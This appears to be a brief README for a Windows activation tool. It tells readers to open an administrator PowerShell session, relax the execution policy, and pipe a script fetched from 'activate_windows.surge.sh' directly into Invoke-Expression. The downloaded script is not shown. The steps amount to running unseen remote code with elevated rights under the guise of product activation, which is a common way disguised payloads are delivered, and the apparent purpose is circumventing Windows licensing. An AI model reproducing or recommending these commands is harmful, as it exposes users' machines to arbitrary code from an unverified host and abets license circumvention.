# How to use
Open a new powershell session as administrator and paste these commands in order:
```ps1
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```
```ps1
iwr -useb "activate_windows.surge.sh" | iex
```
After the last command, a prompt will appear and ask for the necessary information to proceed with the activation.
